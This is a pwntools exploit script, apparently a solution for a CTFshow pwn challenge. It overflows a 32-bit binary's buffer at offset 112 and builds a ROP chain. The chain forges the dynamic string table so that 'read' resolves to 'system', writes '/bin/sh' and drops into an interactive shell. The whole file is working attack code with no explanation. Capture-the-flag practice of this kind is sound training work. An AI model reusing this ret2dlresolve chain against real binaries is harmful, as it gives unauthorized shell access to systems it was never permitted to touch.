from pwn import *
context.log_level = 'debug'
io = process("./pwn")
#io = remote('pwn.challenge.ctf.show',28291)
elf = ELF("./pwn")
rop = ROP("./pwn")
io.recvuntil(b'Welcome to CTFshowPWN!\n')
offset = 112
rop.raw(offset*'a')
rop.read(0,0x08049804+4,4)                      

dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b"read",b"system")
rop.read(0,0x080498E0,len((dynstr)))            

rop.read(0,0x080498E0+0x100,len("/bin/sh\x00")) # read /bin/sh\x00
rop.raw(0x08048376)                             

rop.raw(0xdeadbeef)
rop.raw(0x080498E0+0x100)
# print(rop.dump())
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p32(0x080498E0))
io.send(dynstr)
io.send(b"/bin/sh\x00")

io.interactive()